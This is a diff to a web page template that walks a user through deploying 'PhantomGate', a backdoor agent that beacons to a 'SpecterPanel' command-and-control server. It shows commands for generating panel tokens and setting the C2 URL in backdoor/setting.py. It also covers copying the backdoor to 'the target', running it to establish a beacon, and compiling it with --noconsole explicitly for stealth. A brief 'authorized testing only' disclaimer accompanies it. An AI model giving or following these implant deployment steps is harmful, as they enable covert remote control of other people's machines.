@@ -4,7 +4,6 @@
 
 {% block body %}
 <div class="max-w-5xl mx-auto px-4 py-12 md:py-16">
-  <!-- Header -->
   <div class="text-center mb-12">
     <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-100 dark:bg-indigo-900/40 text-indigo-700 dark:text-indigo-300 text-sm font-medium mb-4">
       <span class="relative flex h-2 w-2">
@@ -17,98 +16,105 @@
       PhantomGate Setup
     </h1>
     <p class="text-slate-600 dark:text-slate-300 max-w-2xl mx-auto">
-      Step-by-step guide to deploy your first agent. Try not to break anything. You probably will.
+      Step-by-step guide to deploy your first agent. Try not to break anything. You probably will. I'm not fixing it.
+    </p>
+    <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xl mx-auto">
+      Four steps. One agent. Infinite possibilities. Some of them legal. Read carefully.
     </p>
   </div>
 
-  <!-- Download button (above steps) -->
   <div class="flex justify-center mb-12">
     <button id="downloadBtn" class="px-8 py-3 rounded-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold shadow-md transition-all hover:scale-105 active:scale-95 flex items-center gap-2">
       <i class="fas fa-download"></i> Download PhantomGate
     </button>
   </div>
 
-  <!-- Steps grid -->
   <div class="space-y-8">
-    <!-- Step 1 -->
     <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
       <div class="flex items-start gap-4">
         <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">1</div>
         <div class="flex-1">
           <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">Token Acquisition</h3>
-          <p class="text-slate-600 dark:text-slate-400 mb-3">Log into SpecterPanel and navigate to <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">Settings → API Token</span>. Generate a fresh token. Don't lose it. I'm not making another one.</p>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Log into SpecterPanel and navigate to <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">Settings → API Token</span>. Generate a fresh token. Don't lose it. I'm not making another one. I'll make you beg.</p>
           <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
             $ curl -X POST https://your-panel.com/api/token/generate -H "Authorization: Bearer &lt;master_key&gt;"
           </div>
-          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">⚠️ Store in env variables. Rotate every 72h. Or don't. See if I care.</p>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">⚠️ Store in env variables. Rotate every 72h. Or don't. See if I care. I do care. Rotate it.</p>
         </div>
       </div>
     </div>
 
-    <!-- Step 2 -->
     <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
       <div class="flex items-start gap-4">
         <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">2</div>
         <div class="flex-1">
           <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">Configure PhantomGate</h3>
-          <p class="text-slate-600 dark:text-slate-400 mb-3">Edit <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">backdoor/setting.py</span> and update the important stuff:</p>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Edit <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">backdoor/setting.py</span> and update the important stuff. Don't skip any of it. I'll know.</p>
           <ul class="list-disc list-inside space-y-1 text-slate-600 dark:text-slate-400 mb-3">
             <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.API_TOKEN</code> – your token. Don't lose it. Again.</li>
-            <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.url</code> – your panel URL (e.g., <code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">https://c2.domain.com</code>)</li>
+            <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.url</code> – your SpecterPanel URL (e.g., <code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">https://c2.domain.com</code>)</li>
             <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.ENCRYPTION_KEY</code> – new 16-byte key. Do it. It's good for you.</li>
           </ul>
           <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
             self.API_TOKEN = "sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."<br>
             self.url = "https://your-panel.com"
           </div>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">If it doesn't work, you probably forgot one. Go back and check. I'll wait.</p>
         </div>
       </div>
     </div>
 
-    <!-- Step 3 -->
     <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
       <div class="flex items-start gap-4">
         <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">3</div>
         <div class="flex-1">
           <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">Deploy & Activate</h3>
-          <p class="text-slate-600 dark:text-slate-400 mb-3">Transfer <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">backdoor/</span> to the target (authorized environment, obviously). Ensure Python 3.9+ is installed. Then pray.</p>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Transfer <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">backdoor/</span> to the target (authorized environment, obviously). Ensure Python 3.9+ is installed. Then pray. Cross your fingers. Maybe sacrifice a goat.</p>
           <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
             $ cd backdoor<br>
             $ python3 phantomgate.py<br>
             [+] Connecting to SpecterPanel...<br>
             [+] Beacon established. Agent ID: 7f3a9c2e
           </div>
-          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">Agent appears in the panel. Issue commands. Watch the magic happen.</p>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">Once running, the agent appears in the panel. Issue commands remotely. Watch the magic happen. Try not to break anything.</p>
         </div>
       </div>
     </div>
 
-    <!-- Step 4 (optional) -->
     <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
       <div class="flex items-start gap-4">
         <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">4</div>
         <div class="flex-1">
           <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">(Optional) Compile Standalone</h3>
-          <p class="text-slate-600 dark:text-slate-400 mb-3">Use PyInstaller. Because Python isn't stealthy enough for you.</p>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Use PyInstaller. Because Python isn't stealthy enough for you. It's never stealthy enough for anyone.</p>
           <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
             $ pip install pyinstaller<br>
             $ cd backdoor<br>
             $ pyinstaller --onefile --noconsole phantomgate.py<br>
             $ ls dist/   # phantomgate.exe or phantomgate
           </div>
-          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">Use <code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">--noconsole</code> to hide the window. For stealth. Obviously.</p>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">Use <code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">--noconsole</code> to hide the window. For stealth. Obviously. That's the whole point.</p>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- Footer note -->
+  <div class="mt-12 rounded-2xl bg-slate-100 dark:bg-slate-900/50 border border-slate-200 dark:border-slate-700 p-6">
+    <h3 class="text-lg font-bold text-slate-800 dark:text-slate-100 mb-3">Pro Tips (From Someone Who's Broken This Before)</h3>
+    <ul class="space-y-2 text-sm text-slate-600 dark:text-slate-400">
+      <li class="flex items-start gap-2"><i class="fas fa-check-circle text-indigo-500 mt-1"></i> Write the token down. On paper. Not a sticky note. Not "passwords.txt." Somewhere safe.</li>
+      <li class="flex items-start gap-2"><i class="fas fa-check-circle text-indigo-500 mt-1"></i> If the agent doesn't appear, check the URL. It's probably the URL. It's always the URL.</li>
+      <li class="flex items-start gap-2"><i class="fas fa-check-circle text-indigo-500 mt-1"></i> Use safe mode in labs. Don't be a hero. Heroes go to jail.</li>
+      <li class="flex items-start gap-2"><i class="fas fa-check-circle text-indigo-500 mt-1"></i> Rotate your tokens. Seriously. Every 72 hours. It's good for you.</li>
+    </ul>
+  </div>
+
   <div class="text-center text-sm text-slate-500 dark:text-slate-400 border-t border-slate-200 dark:border-slate-800 pt-8 mt-12">
-    <p>⚠️ For authorized security testing only. Unauthorized access is illegal. Don't be that guy.</p>
+    <p>⚠️ For authorized security testing only. Unauthorized access is illegal. Don't be that guy. Nobody likes that guy.</p>
+    <p class="mt-2">Built with coffee. Fueled by spite. Supported by sarcasm.</p>
   </div>
 </div>
 
-<!-- Terms Modal (hidden by default) -->
 <div id="termsModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/70 backdrop-blur-sm">
   <div class="bg-white dark:bg-slate-900 rounded-2xl max-w-md w-full mx-4 p-6 border border-slate-200 dark:border-slate-700 shadow-xl">
     <div class="flex justify-between items-center mb-4">
@@ -150,7 +156,7 @@
     const cancelModalBtn = document.getElementById('cancelModalBtn');
     const agreeCheckbox = document.getElementById('agreeCheckbox');
     const downloadLink = document.getElementById('downloadLink');
-    
+
     function openModal() {
       modal.classList.remove('hidden');
       modal.classList.add('flex');
@@ -171,13 +177,13 @@
         downloadLink.setAttribute('disabled', 'disabled');
       }
     }
-    
+
     downloadBtn.addEventListener('click', openModal);
     closeModalBtn.addEventListener('click', closeModal);
     cancelModalBtn.addEventListener('click', closeModal);
     agreeCheckbox.addEventListener('change', updateDownloadButton);
     updateDownloadButton();
-    
+
     modal.addEventListener('click', function(e) {
       if (e.target === modal) closeModal();
     });
